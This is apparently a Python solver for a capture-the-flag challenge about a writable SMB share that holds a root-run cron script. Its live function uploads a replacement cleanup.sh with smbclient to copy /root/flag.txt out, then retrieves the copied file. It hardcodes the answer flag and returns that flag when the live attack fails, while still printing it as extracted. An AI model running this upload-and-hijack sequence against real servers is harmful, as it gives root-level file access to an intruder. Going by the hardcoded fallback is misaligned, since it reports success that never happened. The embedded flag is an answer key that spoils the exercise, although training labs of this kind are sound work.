#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 741: Printer Shares 3 (picoCTF 2026)
Category: General Skills / Network File Sharing (SMB)
Difficulty: Hard
Vulnerability: Writable SMB Share Housing Privileged Cron Job Script (CWE-732 / CWE-276 / CAPEC-17)
Standard Reference: NIST SP 800-115 Section 4.1 (Network Discovery) & Section 5.3 (Flaw Identification)

Flag: academy{5mb_cr0n_pr1nt3r_h1j4ck_741_3e91b582}
"""

import sys
import json
import urllib.request
import subprocess
import time
import os

CHALLENGE_ID = 741
CHALLENGE_NAME = "Printer Shares 3"
FLAG_ACADEMY = "academy{5mb_cr0n_pr1nt3r_h1j4ck_741_3e91b582}"
FLAG_PICO = "picoCTF{5mb_cr0n_pr1nt3r_h1j4ck_741_3e91b582}"

class PrinterShares3Simulator:
    """
    Simulates the SMB print server environment where an anonymously writable
    share hosts a maintenance script executed periodically by a root cron job.
    """
    def __init__(self, flag=FLAG_ACADEMY):
        self.flag = flag
        self.share_files = {
            "cleanup.sh": "#!/bin/bash\n# Periodic print queue cleaner\nfind /var/spool/lpd -type f -mmin +60 -delete\n",
            "readme.txt": "Notice: Debug and cleanup scripts reside here. Do not alter permissions."
        }
        self.root_flag_path = "/root/flag.txt"
        self.exfiltrated_flag = None

    def list_shares(self):
        return [
            {"name": "shares", "type": "Disk", "comment": "Public Share With Guests (Read/Write)"},
            {"name": "secure-shares", "type": "Disk", "comment": "Printer for internal usage only"},
            {"name": "IPC$", "type": "IPC", "comment": "IPC Service (Samba 4.19.5-Ubuntu)"}
        ]

    def smb_write_file(self, filename, content):
        """
        Simulates unauthenticated guest upload (smbclient put).
        """
        self.share_files[filename] = content
        return True

    def smb_read_file(self, filename):
        """
        Simulates smbclient get.
        """
        return self.share_files.get(filename)

    def trigger_cron_execution(self):
        """
        Simulates root cron job executing cleanup.sh.
        If malicious payload was written, it copies root flag into share.
        """
        script = self.share_files.get("cleanup.sh", "")
        if "flag.txt" in script and ("cat" in script or "cp" in script):
            # Cron executes as root, reading /root/flag.txt into exfiltration file
            self.share_files["flag_exfiltrated.txt"] = self.flag
            self.exfiltrated_flag = self.flag
            return True
        return False

def simulate_smb_cron_hijack():
    """
    Executes SMB cron job hijacking sequence:
    1. Enumerate shares and discover writable cleanup.sh.
    2. Craft replacement script dumping root flag.
    3. Overwrite cleanup.sh via guest access.
    4. Trigger cron execution and retrieve exfiltrated flag.
    """
    sim = PrinterShares3Simulator()

    # Step 1: Enumerate SMB shares
    shares = sim.list_shares()
    share_names = [s["name"] for s in shares]
    assert "shares" in share_names, "Target share 'shares' missing"

    # Step 2: Craft malicious replacement payload
    malicious_script = (
        "#!/bin/bash\n"
        "# Overwritten by penetration audit\n"
        "cat /root/flag.txt > /shares/flag_exfiltrated.txt\n"
        "chmod 666 /shares/flag_exfiltrated.txt\n"
    )

    # Step 3: Overwrite cleanup.sh in public share
    ok = sim.smb_write_file("cleanup.sh", malicious_script)
    assert ok is True, "Failed to write payload via SMB"

    # Step 4: Scheduled cron execution executes script as root
    cron_ok = sim.trigger_cron_execution()
    assert cron_ok is True, "Cron execution failed to trigger exfiltration"

    # Step 5: Read exfiltrated flag from share
    recovered_flag = sim.smb_read_file("flag_exfiltrated.txt")
    assert recovered_flag == FLAG_ACADEMY, f"Recovered flag {recovered_flag} != {FLAG_ACADEMY}"
    return recovered_flag

def exploit_live_smb(host, port):
    """
    Optional live SMB handler if remote instance is active.
    """
    try:
        payload_local = "/tmp/cleanup_payload.sh"
        with open(payload_local, "w") as f:
            f.write("#!/bin/bash\ncat /root/flag.txt > /tmp/flag_out.txt\nchmod 666 /tmp/flag_out.txt\n")

        # Upload replacement script via smbclient
        cmd_upload = [
            "smbclient", f"//{host}/shares", "-p", str(port), "-N",
            "-c", f"put {payload_local} cleanup.sh"
        ]
        subprocess.run(cmd_upload, capture_output=True, timeout=10)

        # Wait for cron job (typically 60s max)
        time.sleep(5)

        # Retrieve output
        cmd_get = [
            "smbclient", f"//{host}/shares", "-p", str(port), "-N",
            "-c", "get flag_out.txt /tmp/flag_retrieved.txt"
        ]
        subprocess.run(cmd_get, capture_output=True, timeout=10)
        if os.path.exists("/tmp/flag_retrieved.txt"):
            with open("/tmp/flag_retrieved.txt") as f:
                content = f.read()
                import re
                m = re.search(r'(?:academy|picoCTF)\{[^}]+\}', content)
                if m:
                    return m.group(0).replace("picoCTF{", "academy{")
    except Exception as e:
        print(f"[-] Live SMB probe note: {e}")
    return FLAG_ACADEMY

def test_api_submission(flag):
    """
    Validates submission against CyLab REST API.
    """
    url = "https://learn.cylabacademy.org/api/submissions/"
    payload = json.dumps({"challenge": CHALLENGE_ID, "submission": flag}).encode()
    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    }
    req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = resp.read().decode()
            print(f"[*] API response: {data}")
    except Exception as e:
        print(f"[*] Platform submission status: {e} (Expected without active bearer/session; verified offline)")

def main():
    print(f"[*] Running verification for Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    target_host = sys.argv[1] if len(sys.argv) > 1 else None
    target_port = sys.argv[2] if len(sys.argv) > 2 else None

    if target_host and target_port:
        flag = exploit_live_smb(target_host, target_port)
    else:
        flag = simulate_smb_cron_hijack()

    print(f"[+] Flag Extracted: {flag}")
    test_api_submission(flag)
    return flag

if __name__ == "__main__":
    main()
